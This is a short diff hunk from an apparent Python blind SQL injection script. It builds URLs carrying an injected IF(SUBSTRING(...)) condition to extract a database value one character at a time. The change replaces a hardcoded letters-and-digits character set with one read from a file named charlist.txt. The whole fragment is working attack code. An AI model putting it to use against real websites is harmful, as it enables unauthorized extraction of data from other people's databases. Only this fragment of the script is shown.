@@ -61,7 +61,7 @@ def main():
         urlgen = lambda char, i : root_url + "IF(SUBSTRING(" + conditional + ",%d,1)=\"%s\",1,0)" % (i, char)
         value = ""
         substr_i = 1
-        char_str = string.ascii_letters + string.digits
+        char_str = open("charlist.txt").read()
         char_i = 0
         
         while char_i < len(char_str):
